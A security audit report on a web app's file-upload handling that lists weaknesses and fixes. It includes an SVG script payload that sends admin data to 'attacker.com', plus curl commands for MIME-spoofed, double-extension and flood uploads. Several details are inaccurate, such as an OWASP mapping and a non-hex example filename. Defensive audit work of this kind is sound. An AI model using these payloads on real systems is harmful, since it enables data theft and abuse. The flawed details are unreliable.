# Logo Upload Security Assessment Report

## Executive Summary
The logo upload system has implemented foundational security controls but has several critical and moderate vulnerabilities that should be addressed. The system handles file uploads with basic validation but lacks advanced protections like magic number validation, virus scanning, and has potential MIME type spoofing vulnerabilities.

**Overall Risk Level: MEDIUM-HIGH**

---

## 1. UPLOAD SERVICE & CONTROLLER FINDINGS

### Location
- **Upload Service**: `/Users/mikeyoung/CODING/Elope/server/src/services/upload.service.ts`
- **Routes**: `/Users/mikeyoung/CODING/Elope/server/src/routes/tenant-admin.routes.ts`
- **Multer Config**: Lines 30-43 in tenant-admin.routes.ts

### Architecture
```
Client Upload
    ↓
Express Route: POST /v1/tenant/admin/logo
    ↓
Multer Middleware (memoryStorage)
    ↓
TenantAuthMiddleware (JWT verification)
    ↓
UploadService (validation + storage)
    ↓
File System Storage: /uploads/logos/ or /uploads/packages/
    ↓
Static File Serving: express.static()
```

---

## 2. AUTHENTICATION & AUTHORIZATION ANALYSIS

### Status: STRONG ✓

#### Tenant Authentication Middleware
**File**: `/Users/mikeyoung/CODING/Elope/server/src/middleware/tenant-auth.ts`

**Strengths**:
- JWT token verification with proper Bearer token format validation (lines 27-35)
- Token type validation - explicitly rejects admin tokens on tenant routes (lines 40-47)
- Required tenant context fields validation (tenantId, slug) (lines 49-54)
- Token payload properly attached to `res.locals.tenantAuth` for use in controllers

**Protection Method**:
```typescript
// Upload route (line 241-245 in tenant-admin.routes.ts)
router.post(
  '/logo',
  upload.single('logo'),
  (req, res) => controller.uploadLogo(req, res)
);
// Protected via global middleware that applies tenantAuthMiddleware to /v1/tenant/admin/* routes
```

**Route Protection**: Lines 307 in index.ts
```typescript
app.use('/v1/tenant/admin', tenantAuthMiddleware, tenantAdminRoutes);
```

#### Controller-Level Checks
**uploadLogo() method** (lines 75-125):
```typescript
const tenantAuth = res.locals.tenantAuth;
if (!tenantAuth) {
  res.status(401).json({ error: 'Unauthorized: No tenant authentication' });
  return;
}
const tenantId = tenantAuth.tenantId;
```

**Verdict**: Authentication is properly implemented with multi-layer checks.

---

## 3. FILE SIZE VALIDATION

### Status: IMPLEMENTED ✓

#### Multer-Level Validation
**Lines 30-43 in tenant-admin.routes.ts**:
```typescript
const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 2 * 1024 * 1024, // 2MB for logos
  },
});

const uploadPackagePhoto = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB for package photos
  },
});
```

#### Application-Level Validation
**Lines 71-90 in upload.service.ts**:
```typescript
private validateFile(file: UploadedFile, maxSizeMB?: number): void {
  const maxSize = maxSizeMB || this.maxFileSizeMB; // 2MB default
  const maxSizeBytes = maxSize * 1024 * 1024;
  if (file.size > maxSizeBytes) {
    throw new Error(`File size exceeds maximum of ${maxSize}MB`);
  }
  // ... additional checks
}
```

#### Configuration
**Lines 38-50 in upload.service.ts**:
```typescript
this.logoUploadDir = process.env.UPLOAD_DIR || path.join(process.cwd(), 'uploads', 'logos');
this.maxFileSizeMB = parseInt(process.env.MAX_UPLOAD_SIZE_MB || '2', 10);
this.maxPackagePhotoSizeMB = 5;
```

**Limits Configured**:
- Logo uploads: 2MB
- Package photos: 5MB
- Both configurable via environment variables

**Verdict**: File size validation properly implemented at both multer and application levels.

---

## 4. FILE TYPE VALIDATION

### Status: IMPLEMENTED BUT WEAK ⚠️

#### MIME Type Validation (Lines 80-84 in upload.service.ts)
```typescript
private allowedMimeTypes: string[] = [
  'image/jpeg',
  'image/jpg',
  'image/png',
  'image/svg+xml',
  'image/webp',
];

if (!this.allowedMimeTypes.includes(file.mimetype)) {
  throw new Error(`Invalid file type. Allowed types: ${allowedMimeTypes}`);
}
```

### Critical Vulnerabilities Identified

#### VULNERABILITY 1: MIME Type Spoofing (HIGH)
**Issue**: System only validates MIME type from client (multer file.mimetype), which can be spoofed.

**Attack Vector**:
```bash
# Attacker can upload malicious executable with fake MIME type
curl -F "logo=@malware.exe;type=image/jpeg" http://localhost:5000/v1/tenant/admin/logo

# File will pass validation because only MIME type is checked
# Stored with generated filename like: logo-1699999999-a1b2c3d4.exe
# Served directly by express.static() without Content-Type headers set properly
```

#### VULNERABILITY 2: No Magic Number Validation (HIGH)
**Issue**: No verification of actual file content (magic numbers/file signatures).

**Impact**: 
- Malicious executables disguised as images can be stored and served
- JavaScript files disguised as images could be served
- ZIP files disguised as images could bypass security

**Example**:
```
File content: MZ\x90\x00... (PE executable header)
MIME type: image/jpeg
File extension: .jpg
Result: ACCEPTED - stored as logo-timestamp-random.jpg
```

#### VULNERABILITY 3: Extension-Based Execution Risk (MEDIUM)
**Issue**: File extension validation only extracts from original filename:
```typescript
const ext = path.extname(originalName); // Gets extension from user-supplied filename
return `${prefix}-${timestamp}-${randomStr}${ext}`;
```

**Problem**: Original extension comes from `originalname` field which is user-controlled and can be spoofed:
```typescript
originalname: 'image.jpg.php'  // Extension would be .php
originalname: 'image.php.jpg'  // Extension would be .jpg (deceiving)
```

#### VULNERABILITY 4: SVG Injection Risk (MEDIUM)
**Issue**: SVG files are allowed and can contain embedded JavaScript:
```svg
<svg onload="alert('XSS')">
<script>
  fetch('/api/admin/secret').then(r => r.json()).then(d => fetch('attacker.com', {body: JSON.stringify(d)}))
</script>
```

While stored safely, if SVG is served with `Content-Type: image/svg+xml`, it can execute scripts if embedded in user-facing pages without proper sandboxing.

**Verdict**: MIME type validation only - insufficient protection against file content attacks.

---

## 5. PATH TRAVERSAL PROTECTION

### Status: PROPERLY PROTECTED ✓

#### Filename Generation (Lines 95-100 in upload.service.ts)
```typescript
private generateFilename(originalName: string, prefix: string = 'logo'): string {
  const ext = path.extname(originalName);
  const timestamp = Date.now();
  const randomStr = crypto.randomBytes(8).toString('hex');
  return `${prefix}-${timestamp}-${randomStr}${ext}`;
}
```

**Protection**:
- Original filename is NOT used directly
- Generated filename format: `prefix-timestamp-randomhex.ext`
- Example: `logo-1699999999-a1b2c3d4e5f6g7h8.jpg`
- Random hex makes filename guessing infeasible (64-bit entropy)

#### File Path Construction (Lines 115, 156 in upload.service.ts)
```typescript
const filepath = path.join(this.logoUploadDir, filename);
await fs.promises.writeFile(filepath, file.buffer);
```

**Analysis**:
- `path.join()` normalizes paths and removes `../` sequences
- Upload directories are controlled by environment/application
- No user input directly concatenated into file paths

**Attack Scenario Testing**:
```typescript
// Attacker tries path traversal with filename parameter
const maliciousInput = '../../etc/passwd';
const generated = this.generateFilename(maliciousInput);
// Result: logo-1699999999-a1b2c3d4e5f6g7h8..passwd
// Stored safely without traversal
```

**Verdict**: Path traversal properly prevented through filename regeneration.

---

## 6. VIRUS SCANNING & MALWARE DETECTION

### Status: NOT IMPLEMENTED ✗

**Critical Gap**: No virus scanning integration.

#### What's Missing:
- No ClamAV or similar antivirus engine integration
- No file content scanning for malicious patterns
- No magic number/file signature validation
- No integration with third-party scanning services (VirusTotal, etc.)

#### Recommendations to Add:
```typescript
// Would need to implement:
// 1. ClamAV daemon integration
// 2. Magic number validation
// 3. File type detection library
```

**Dependencies Not Present** (from package.json):
```json
// ❌ Missing:
"clamav.js": "^0.0.x",  // ClamAV integration
"file-type": "^18.x",    // Magic number detection
"mmmagic": "^0.x.x"      // Alternative magic detection
```

**Verdict**: CRITICAL VULNERABILITY - No antivirus protection. Malicious files can be uploaded and stored.

---

## 7. STORAGE LOCATION & FILE PERMISSIONS

### Status: LOCAL FILESYSTEM (MVP) ⚠️

#### Storage Configuration (Lines 38-41, 54-56 in upload.service.ts)
```typescript
this.logoUploadDir = process.env.UPLOAD_DIR || path.join(process.cwd(), 'uploads', 'logos');
this.packagePhotoUploadDir = path.join(process.cwd(), 'uploads', 'packages');

private ensureUploadDir(dir: string): void {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
    logger.info({ uploadDir: dir }, 'Created upload directory');
  }
}
```

#### Directory Permissions Issue (MEDIUM)
**Problem**: Directory created with default permissions (typically 0755):
```typescript
fs.mkdirSync(dir, { recursive: true }); // No mode specified
// Created with umask default: usually 0755 (rwxr-xr-x)
```

**Risk**: 
- World-readable uploads directory
- Any system user can read uploaded files
- In multi-user systems, privacy concern

**Fix Needed**:
```typescript
fs.mkdirSync(dir, { recursive: true, mode: 0o700 }); // Only owner can read
```

#### File Permissions Issue (MEDIUM)
**Problem**: Uploaded files created with default permissions:
```typescript
await fs.promises.writeFile(filepath, file.buffer);
// Files typically created as 0644 (rw-r--r--)
```

**Risk**: Any user on system can read uploaded files

**Fix Needed**:
```typescript
await fs.promises.writeFile(filepath, file.buffer, { mode: 0o600 });
```

#### Static File Serving (Lines 87-93 in app.ts)
```typescript
app.use('/uploads/logos', express.static(logoUploadDir));
app.use('/uploads/packages', express.static(packagePhotoUploadDir));
```

**Analysis**:
- Files are publicly accessible via HTTP
- No authentication required to download
- express.static() doesn't set restrictive headers
- Content-Disposition not set (files can be opened in browser vs. downloaded)

**Verdict**: Filesystem permissions not restricted. Recommend cloud storage for production.

---

## 8. RATE LIMITING ON UPLOADS

### Status: GLOBAL RATE LIMITING ONLY (WEAK) ⚠️

#### Global Rate Limiter (rateLimiter.ts, lines 4-26)
```typescript
export const publicLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 300,                    // 300 requests per 15 minutes
  // ... config
});

export const adminLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 120,                    // 120 requests per 15 minutes
  // ... config
});
```

#### Application to Upload Endpoints (app.ts, lines 65-68)
```typescript
// Global rate limiting applied
app.use(skipIfHealth);
app.use('/v1/admin', adminLimiter);

// Tenant upload routes also protected:
app.use('/v1/tenant/admin', tenantAuthMiddleware, tenantAdminRoutes);
// BUT: No specialized upload rate limiting
```

#### Issue: No Upload-Specific Rate Limiting
**Problems**:
1. Upload rate limit = 120 requests/15 min (same as all admin endpoints)
2. No maximum concurrent uploads limit
3. No per-file-size penalty
4. No per-user upload quota

**Attack Scenario**:
```
Attacker authenticated as tenant:
- 120 uploads × 5MB = 600MB storage in 15 minutes
- Can fill disk, cause DoS
- No per-user quotas to prevent abuse
```

#### Recommended Improvements:
```typescript
export const uploadLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,  // 1 hour
  max: 10,                    // 10 uploads per hour per user
  keyGenerator: (req, res) => res.locals.tenantAuth?.tenantId || 'unknown',
  skip: (req) => !req.file,
});
```

**Verdict**: Rate limiting insufficient for file upload protection.

---

## 9. MULTER MIDDLEWARE ANALYSIS

### Proper Configuration (Lines 30-43)
```typescript
const upload = multer({
  storage: multer.memoryStorage(),  // ✓ Safe - prevents disk exhaustion from failed uploads
  limits: {
    fileSize: 2 * 1024 * 1024,      // ✓ Size limit enforced
  },
  // ❌ MISSING: fileFilter for MIME type validation at multer level
});
```

### Missing Features
```typescript
// NOT IMPLEMENTED:
fileFilter: (req, file, cb) => {
  // Could add additional validation here
  if (!allowedMimeTypes.includes(file.mimetype)) {
    cb(new Error('Invalid file type'));
  } else {
    cb(null, true);
  }
}
```

#### Error Handling (Lines 49-66)
```typescript
function handleMulterError(
  error: any,
  req: Request,
  res: Response,
  next: NextFunction
): void {
  if (error instanceof multer.MulterError) {
    if (error.code === 'LIMIT_FILE_SIZE') {
      res.status(413).json({ error: 'File too large (max 5MB)' });
      return;
    }
    res.status(400).json({ error: error.message });
    return;
  }
  next(error);
}
```

**Note**: Error message says "max 5MB" but logo uploads are 2MB. Minor inconsistency in error message.

**Verdict**: Multer properly configured with memory storage and size limits.

---

## 10. TENANT ISOLATION VERIFICATION

### Status: PROPERLY IMPLEMENTED ✓

#### Logo Upload (Lines 75-125 in tenant-admin.routes.ts)
```typescript
async uploadLogo(req: Request, res: Response): Promise<void> {
  const tenantAuth = res.locals.tenantAuth;  // ✓ Tenant context from JWT
  if (!tenantAuth) {
    res.status(401).json({ error: 'Unauthorized' });
    return;
  }
  const tenantId = tenantAuth.tenantId;
  
  // Upload file
  const result = await uploadService.uploadLogo(req.file as any, tenantId);
  
  // Update tenant's own branding record
  const tenant = await this.tenantRepository.findById(tenantId);
  const updatedBranding = {
    ...currentBranding,
    logo: result.url,  // ✓ Store URL in tenant's branding record
  };
  await this.tenantRepository.update(tenantId, {
    branding: updatedBranding,
  });
}
```

#### Package Photo Upload (Lines 391-481)
```typescript
router.post(
  '/packages/:id/photos',
  uploadPackagePhoto.single('photo'),
  handleMulterError,
  async (req: Request, res: Response, next: NextFunction) => {
    const tenantAuth = res.locals.tenantAuth;
    const tenantId = tenantAuth.tenantId;
    const { id: packageId } = req.params;
    
    // ✓ Verify package exists AND belongs to tenant
    const pkg = await catalogService.getPackageById(tenantId, packageId);
    if (!pkg) {
      res.status(404).json({ error: 'Package not found' });
      return;
    }
    if (pkg.tenantId !== tenantId) {
      res.status(403).json({ error: 'Forbidden: Package belongs to different tenant' });
      return;
    }
```

#### Photo Deletion (Lines 493-542)
```typescript
router.delete(
  '/packages/:id/photos/:filename',
  async (req: Request, res: Response, next: NextFunction) => {
    // ✓ Verify package ownership before deletion
    if (pkg.tenantId !== tenantId) {
      res.status(403).json({ error: 'Forbidden' });
      return;
    }
    
    // ✓ Verify photo exists in package's photos array (prevents arbitrary deletion)
    const currentPhotos = (pkg.photos as any[]) || [];
    const updatedPhotos = currentPhotos.filter((p: any) => p.filename !== filename);
    
    if (updatedPhotos.length === currentPhotos.length) {
      res.status(404).json({ error: 'Photo not found in package' });
      return;
    }
```

**Critical Protection**: Photo deletion verifies filename exists in package's photos array first, preventing attackers from deleting arbitrary files by guessing filenames.

**Verdict**: Excellent tenant isolation implementation.

---

## 11. SECURITY HEADERS FOR UPLOADS

### Status: PARTIALLY IMPLEMENTED ⚠️

#### Helmet Protection (Lines 29 in app.ts)
```typescript
app.use(helmet());
```

#### Static File Serving (Lines 87-93)
```typescript
app.use('/uploads/logos', express.static(logoUploadDir));
app.use('/uploads/packages', express.static(packagePhotoUploadDir));
```

**Issue**: No custom security headers for uploaded files:

```javascript
// NOT SET:
// X-Content-Type-Options: nosniff (prevents MIME sniffing)
// Content-Disposition: attachment (forces download vs. rendering)
// Content-Security-Policy: (prevents XSS from uploaded files)
// X-Frame-Options: DENY (prevents framing attacks)
```

**Recommendation**:
```typescript
app.use('/uploads/logos', (req, res, next) => {
  res.set('X-Content-Type-Options', 'nosniff');
  res.set('Content-Disposition', 'inline; filename=logo.jpg');
  res.set('Content-Security-Policy', "default-src 'none'");
  res.set('X-Frame-Options', 'DENY');
  next();
}, express.static(logoUploadDir));
```

---

## SUMMARY OF VULNERABILITIES

### CRITICAL (Immediate Action Required)
1. **No Magic Number Validation** - Malicious files disguised as images can be uploaded
2. **No Virus Scanning** - Infected files cannot be detected
3. **MIME Type Spoofing** - Client-controlled MIME type not validated against actual content

### HIGH
4. **SVG XSS Risk** - SVG files containing scripts can execute in browsers
5. **Double Extension Attack** - Filename parsing doesn't prevent `image.php.jpg` attacks

### MEDIUM
6. **Insufficient Upload Rate Limiting** - 120 uploads/15min could exhaust storage
7. **Inadequate File Permissions** - Uploaded files world-readable (0644)
8. **Missing Security Headers** - No Content-Type-Options: nosniff for uploads
9. **Inconsistent Error Messages** - "max 5MB" error for 2MB logo uploads

### LOW
10. **Incomplete Configuration Validation** - UPLOAD_DIR env var affects both services inconsistently

---

## COMPLIANCE & RISK ASSESSMENT

### OWASP Top 10 Mapping
- **A04:2021 - Insecure File Upload**: Multiple vulnerabilities
- **A06:2021 - Vulnerable and Outdated Components**: No virus scanning library
- **A01:2021 - Broken Access Control**: Tenant isolation correctly implemented

### PCI DSS (If handling payment data)
- **Requirement 6.5.8**: Protected against file upload vulnerabilities - **FAILING**
- **Requirement 12.2.1**: Implement file upload security - **FAILING**

### GDPR (If storing user data in uploads)
- **Article 5**: Data integrity and confidentiality - **WEAK**
- **Article 32**: Secure processing - **PARTIALLY MET**

---

## RECOMMENDATIONS (Priority Order)

### Priority 1: CRITICAL (Implement Immediately)
```typescript
// 1. Add magic number validation
npm install file-type

// 2. Implement virus scanning
npm install clamav.js

// 3. Validate file signatures
import FileType from 'file-type';

async uploadLogo(file: UploadedFile, tenantId: string) {
  // Validate MIME type
  const fileType = await FileType.fromBuffer(file.buffer);
  
  if (!fileType) {
    throw new Error('Unable to determine file type');
  }
  
  if (!['image/jpeg', 'image/png'].includes(fileType.mime)) {
    throw new Error('Invalid file type');
  }
  
  // Scan for viruses (if ClamAV enabled)
  const isSuspicious = await virusScanner.scan(file.buffer);
  if (isSuspicious) {
    throw new Error('File failed security scanning');
  }
}
```

### Priority 2: HIGH (Implement Before Production)
```typescript
// 1. Disable SVG uploads or serve with Content-Disposition: attachment
const allowedMimeTypes = [
  'image/jpeg',
  'image/png',
  'image/webp',
  // 'image/svg+xml', // Remove or handle specially
];

// 2. Implement upload-specific rate limiting
import rateLimit from 'express-rate-limit';

const uploadLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,  // 1 hour
  max: 10,                    // 10 uploads per hour per tenant
  keyGenerator: (req, res) => res.locals.tenantAuth?.tenantId || 'unknown',
  skip: (req) => !req.file,
});

router.post('/logo', uploadLimiter, upload.single('logo'), ...);

// 3. Fix file permissions
fs.mkdirSync(dir, { recursive: true, mode: 0o700 });
fs.writeFileSync(path, buffer, { mode: 0o600 });
```

### Priority 3: MEDIUM (Implement in Next Release)
```typescript
// 1. Add security headers for uploaded files
app.use('/uploads', (req, res, next) => {
  res.set('X-Content-Type-Options', 'nosniff');
  res.set('X-Frame-Options', 'DENY');
  res.set('Content-Disposition', 'inline');
  next();
}, express.static(uploadDir));

// 2. Implement storage quota per tenant
const tenantQuota = 100 * 1024 * 1024; // 100MB per tenant
const currentUsage = await calculateTenantUploadSize(tenantId);
if (currentUsage + newFileSize > tenantQuota) {
  throw new Error('Storage quota exceeded');
}

// 3. Use cloud storage (S3, Cloudinary) instead of local filesystem
// Already noted in code comments as future enhancement
```

### Priority 4: NICE-TO-HAVE
```typescript
// 1. Add image optimization
npm install sharp

// 2. Add malware pattern detection
npm install clamscan

// 3. Implement CDN for file serving
// Use CloudFront or similar
```

---

## TESTING RECOMMENDATIONS

### Security Test Cases
```bash
# Test 1: MIME type spoofing
curl -F "logo=@executable.exe;type=image/jpeg" \
  -H "Authorization: Bearer token" \
  http://localhost:5000/v1/tenant/admin/logo

# Test 2: Path traversal
curl -F "logo=@test.jpg" \
  -F "filename=../../etc/passwd" \
  http://localhost:5000/v1/tenant/admin/logo

# Test 3: Double extension
echo "<?php phpinfo(); ?>" > test.php.jpg
curl -F "logo=@test.php.jpg" \
  http://localhost:5000/v1/tenant/admin/logo

# Test 4: XSS via SVG
curl -F "logo=@<svg onload=alert('xss')>.svg" \
  http://localhost:5000/v1/tenant/admin/logo

# Test 5: Rate limiting
for i in {1..150}; do
  curl -F "logo=@test.jpg" \
    http://localhost:5000/v1/tenant/admin/logo &
done
wait
```

---

## DEPLOYMENT CHECKLIST

- [ ] Implement magic number validation
- [ ] Add virus scanning integration (ClamAV or VirusTotal)
- [ ] Implement upload-specific rate limiting
- [ ] Fix file/directory permissions (0o600/0o700)
- [ ] Add security headers for uploaded files
- [ ] Remove SVG upload support or serve with Content-Disposition: attachment
- [ ] Implement storage quotas per tenant
- [ ] Setup log monitoring for upload attempts
- [ ] Configure malware alerts
- [ ] Test with OWASP ZAP or Burp Suite
- [ ] Document upload security policy
- [ ] Setup automated compliance scanning

---

## CODE LOCATIONS SUMMARY

| Component | File Path | Lines | Status |
|-----------|-----------|-------|--------|
| Upload Service | `server/src/services/upload.service.ts` | 1-237 | Needs enhancement |
| Routes | `server/src/routes/tenant-admin.routes.ts` | 29-543 | Good |
| Auth Middleware | `server/src/middleware/tenant-auth.ts` | 1-71 | Excellent |
| Rate Limiting | `server/src/middleware/rateLimiter.ts` | 1-47 | Weak for uploads |
| App Setup | `server/src/app.ts` | 86-93 | Needs headers |

